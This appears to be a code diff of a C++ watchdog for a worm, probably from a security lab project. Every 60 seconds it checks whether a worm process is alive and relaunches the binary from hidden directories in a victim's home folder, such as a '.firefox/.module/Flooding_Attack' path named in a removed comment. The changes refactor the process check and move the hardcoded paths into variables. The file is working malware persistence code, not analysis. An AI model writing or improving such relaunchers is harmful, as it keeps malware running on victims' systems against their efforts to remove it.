@@ -5,17 +5,14 @@
  * whether the worm is running or not for every 60 seconds. This program itself
  * does not perform any payload.
  *
- * The first worm should be put at "/home/victim/.etc/.module/Flooding_Attack"
- * while another tentative put at
- * "/home/victim/.firefox/.module/Flooding_Attack"
+ * The first worm should be put at var LOCATION_A while another tentative put at
+ * var LOCATION_B
  */
 
-#include <signal.h>
 #include <stdlib.h>
 #include <sys/stat.h>
-#include <sys/types.h>
+#include <sys/wait.h>
 #include <unistd.h>
-#include <fstream>
 #include <iostream>
 #include <string>
 
@@ -26,7 +23,10 @@
 std::string path_bin;
 
 // Queires if the program is running by given PID.
-bool isWormRunning(int pid) { return kill(pid, 0) == 0; }
+bool isWormRunning(pid_t pid) {
+    int status;
+    return waitpid(pid, &status, WNOHANG) == 0;
+}
 
 // Queries any location the worm binary is repalced. If no bin file exists,
 // return empty string.
@@ -43,7 +43,7 @@ std::string isWormDistributed() {
 
 // Executes the worm placed at given location. Returns the PID of the executed
 // worm.
-int runWorm(std::string& loc) {
+pid_t runWorm(std::string& loc) {
     pid_t pid = fork();
     if (pid == 0) {
         // Children
@@ -55,11 +55,12 @@ int runWorm(std::string& loc) {
 
 int main() {
     std::cout << "Timer starts." << std::endl;
-    int pid = -1;
+    pid_t pid = -1;
     while (1) {
         std::cout << "Checking the worm with PID " << pid << " ." << std::endl;
         if (pid < 0 || !isWormRunning(pid)) {
-            std::cout << "Worm not running. Trying to execute the worm." << std::endl;
+            std::cout << "Worm not running. Trying to execute the worm."
+                      << std::endl;
             std::string path = isWormDistributed();
             if (path == "") {
                 std::cout << "Failed to execute the worm." << std::endl;
@@ -71,8 +72,7 @@ int main() {
                 break;
             }
             std::cout << "Worm executed. PID " << pid << " ." << std::endl;
-        } 
-        else {
+        } else {
             std::cout << "Worm running." << std::endl;
         }
         usleep(MINUTE);
